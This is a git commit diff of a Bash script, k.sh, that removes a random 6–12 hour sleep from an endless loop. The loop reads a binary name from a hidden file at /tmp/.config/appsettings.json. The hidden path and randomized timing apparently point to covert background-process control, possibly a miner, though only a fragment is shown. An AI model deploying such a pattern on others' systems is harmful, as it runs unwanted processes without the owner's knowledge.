2832d65f22735c2aebf60adae1d463ebb76c4029
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-05-13 12:02:26 +0800

    Update k.sh

--- k.sh
+++ k.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
 
 while true; do
-  delay="$[`od -An -N2 -i /dev/urandom` % 21600 + 21600]"
-  [ -n "$delay" ] || break
-  sleep "$delay"
+  #delay="$[`od -An -N2 -i /dev/urandom` % 21600 + 21600]"
+  #[ -n "$delay" ] || break
+  #sleep "$delay"
   [ -f "/tmp/.config/appsettings.json" ] || continue
   pName=`grep "trainerBinary" "/tmp/.config/appsettings.json" |cut -d'"' -f4`
   [ -n "$pName" ] || pName="li"
